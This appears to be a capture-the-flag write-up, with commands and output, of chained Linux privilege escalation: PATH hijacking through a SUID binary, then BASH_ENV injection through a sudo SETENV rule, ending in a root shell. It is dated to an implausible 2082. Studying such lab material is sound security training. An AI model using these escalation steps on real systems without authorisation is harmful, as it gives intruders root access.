
  

**Event:** TARANGA Winter CTF 2082  

**Category:** System Hijacking  

**Challenges Solved:** 2 / 2  

**Total Points:** 550 (250 + 300)  

**Author:** 1redmissed
  

---

  

## Overview


Both challenges are chained on the same isolated Ubuntu 24.04 machine, accessible over SSH. The objective is to escalate privileges in two stages: first from `ctfplayer` to `dev_admin` (user flag), then from `dev_admin` to `root` (root flag). Each stage exploits a distinct misconfiguration in the system.

  

---

  

## Challenge 1 — PATH Hijacking via SUID Binary

  

**Points:** 250  

**Flag:** `TARANGACtf{St4g3_1_P4th_H1j4ck3d!}`

  

### Reconnaissance

  

After indentifing service behind the port 8006. SSH into the box on the non-standard port `8006`, we land inside an isolated workspace at `/tmp/workspace_<random>`.

  

```bash

ssh ctfplayer@95.217.235.116 -p 8006

```

  

Initial enumeration of `/etc/passwd` reveals three non-system user accounts:

  

```

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
ctfplayer:x:1001:1001::/home/ctfplayer:/bin/bash
dev_admin:x:1002:1002::/home/dev_admin:/bin/bash

```

  

Accessing `/home/dev_admin` is denied for our current user. The next logical step is to look for privilege escalation vectors.

  

### Finding the SUID Binary

  

Scanning for SUID binaries reveals a non-standard entry that stands out immediately:

  

```bash

find / -perm -4000 -type f 2>/dev/null

```

  

```

/usr/local/bin/syscheck    ← non-standard, suspicious
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

...

```

  

Inspecting its ownership confirms the opportunity:

  

```bash

ls -la /usr/local/bin/syscheck

# -rwsr-xr-x 1 dev_admin dev_admin 16184 Jan 6 07:04 /usr/local/bin/syscheck

```

  

The binary is SUID and owned by `dev_admin`, meaning it runs with `dev_admin`'s effective UID regardless of who executes it.

  

### Analyzing the Binary

  

Without `strace` or `file` available, `strings` becomes the primary static analysis tool:

  

```bash
file /usr/local/bin/syscheck
bash: file: command not found

strace /usr/local/bin/syscheck 2>&1
bash: strace: command not found

strings /usr/local/bin/syscheck

```

  

Key output:

  

```

--- System Status Checker v2.0 ---

[*] Checking currently running processes...

```

  

Running the binary confirms it calls `ps` internally to list processes:

  

```

PID TTY    TIME CMD

111 pts/0  0:00 syscheck

112 pts/0  0:00 sh

113 pts/0  0:00 ps         ← called via system()

```

  

Crucially, `strings` reveals it calls `ps` through `system()` **without an absolute path**. This means the binary resolves `ps` by searching `$PATH` — which we control as the calling user.

  

### Exploiting PATH Hijacking

  

The exploit is straightforward: create a fake `ps` binary in a directory we own, then prepend that directory to `$PATH`. When the SUID binary calls `ps`, it executes our payload instead — but with `dev_admin`'s effective UID.

  

```bash

mkdir /tmp/exploit

cd /tmp/exploit

  

# Create malicious ps that spawns a shell

echo '#!/bin/bash' > ps

echo '/bin/bash' >> ps

chmod +x ps

  

# Prepend our directory to PATH

export PATH=/tmp/exploit:$PATH

  

# Trigger the SUID binary

/usr/local/bin/syscheck

--- System Status Checker v2.0 ---
[*] Checking currently running processes...
dev_admin@<?????>:/tmp/exploit$

```

  

The shell drops us into a session as `dev_admin`:

  

```

dev_admin@<?????>:/tmp/exploit$

```

  

### Capturing the Flag

  

```bash

cat /home/dev_admin/user.txt

# TARANGACtf{St4g3_1_P4th_H1j4ck3d!}

```

  

---

  

## Challenge 2 — BASH_ENV Injection via sudo SETENV

  

**Points:** 300  

**Flag:** `TARANGACtf{St4g3_2_LD_PR3L0AD_M4st3r!}`

  

> **Note:** The flag name references `LD_PRELOAD`, but the actual winning technique was `BASH_ENV` environment variable injection - a closely related but distinct approach that abuses how Bash sources environment files before script execution.

  

### Reconnaissance as dev_admin

  

With a shell as `dev_admin` (obtained from Challenge 1), the first thing to check is sudo privileges:

  

```bash

sudo -l

Matching Defaults entries for dev_admin on 612a2be45d86:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User dev_admin may run the following commands on 612a2be45d86:
    (ALL) SETENV: NOPASSWD: /usr/bin/taranga_backup

```

  

```

User dev_admin may run the following commands on 612a2be45d86:

    (ALL) SETENV: NOPASSWD: /usr/bin/taranga_backup

```

  

Two critical details here:

  

- **`NOPASSWD`** — no password required to run this command as root.

- **`SETENV`** — the sudoer rule explicitly permits the user to pass environment variables through to the sudo session, overriding `env_reset`.

  

### Inspecting the Target Binary

  

```bash

cat /usr/bin/taranga_backup

```

  

```bash

#!/bin/bash

echo "Running Taranga System Backup..."

echo "Backup to /dev/null complete."

```

  

It's a plain Bash script. This is significant: Bash reads the `BASH_ENV` environment variable at startup and **sources whatever file path it points to** before executing the script body. Combined with `SETENV`, this is a direct root shell vector.

  

### The BASH_ENV Injection

  

Create a payload script that spawns a shell:

  

```bash

echo '#!/bin/bash' > /tmp/exploit/evil.sh

echo '/bin/bash' >> /tmp/exploit/evil.sh

chmod +x /tmp/exploit/evil.sh

sudo BASH_ENV=/tmp/exploit/evil.sh /usr/bin/taranga_backup
root@612a2be45d86:/tmp/exploit#

```

  

Execute `taranga_backup` via sudo while injecting `BASH_ENV`:

  

```bash

sudo BASH_ENV=/tmp/exploit/evil.sh /usr/bin/taranga_backup

```

  

**Execution flow:**

  

1. `sudo` runs `/usr/bin/taranga_backup` as root.

2. Because `SETENV` is set in the sudoers rule, `BASH_ENV` is preserved in the environment.

3. Bash sources `/tmp/exploit/evil.sh` before the script body runs.

4. `evil.sh` calls `/bin/bash` — spawning a root shell.

  

```

root@612a2be45d86:/tmp/exploit#

```

  

### Capturing the Flag

  

```bash

cat /root/root.txt

# TARANGACtf{St4g3_2_LD_PR3L0AD_M4st3r!}

```

  

---

  

## Attack Chain Summary

  

```

[ctfplayer] --( SUID PATH Hijack )--> [dev_admin] --( BASH_ENV + sudo SETENV )--> [root]

```

  

| Stage | Technique | Vulnerable Component | Points |

|-------|-----------|----------------------|--------|

| 1 | PATH Hijacking | SUID binary calling `ps` without absolute path | 250 |

| 2 | BASH_ENV Injection | sudo `SETENV` on a Bash script without env sanitization | 300 |

  

---

  

## Key Takeaways

  

**For attackers:**

- Always run `find / -perm -4000 -type f 2>/dev/null` and `sudo -l` as early enumeration steps.

- `strings` on an SUID binary can reveal relative command calls even without a debugger.

- The combination of `SETENV` + `NOPASSWD` on a Bash script is almost always exploitable via `BASH_ENV`, `PS4` (with `-x`), or `LD_PRELOAD` (for dynamic binaries).